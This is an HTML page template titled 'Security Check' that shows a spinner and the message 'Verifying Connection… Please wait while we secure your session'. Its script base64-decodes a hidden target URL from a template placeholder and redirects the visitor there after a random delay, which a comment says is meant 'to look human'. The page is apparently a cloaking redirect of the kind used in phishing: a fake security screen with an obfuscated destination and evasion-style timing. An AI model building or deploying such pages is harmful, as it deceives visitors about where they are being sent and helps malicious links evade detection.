<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body {
            background-color: #121212;
            color: #e0e0e0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            text-align: center;
            padding: 20px;
        }
        .loader {
            width: 48px;
            height: 48px;
            border: 3px solid #333;
            border-bottom-color: #007bff;
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h2 {
            font-weight: 400;
            font-size: 18px;
            margin: 0 0 10px 0;
        }
        p {
            color: #666;
            font-size: 12px;
            margin: 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <span class="loader"></span>
        <h2>Verifying Connection</h2>
        <p>Please wait while we secure your session...</p>
    </div>

    <script nonce="{{ nonce }}">
        (function() {
            var _k = "{{ encoded_target }}";
            
            function _unlock() {
                try {
                    var _u = atob(_k);
                    window.location.replace(_u);
                } catch (e) {
                    console.error("Connection failed");
                }
            }

            // Random delay between 800ms and 2000ms to look human
            var _delay = Math.floor(Math.random() * 1200) + 800;
            setTimeout(_unlock, _delay);
        })();
    </script>
</body>
</html>
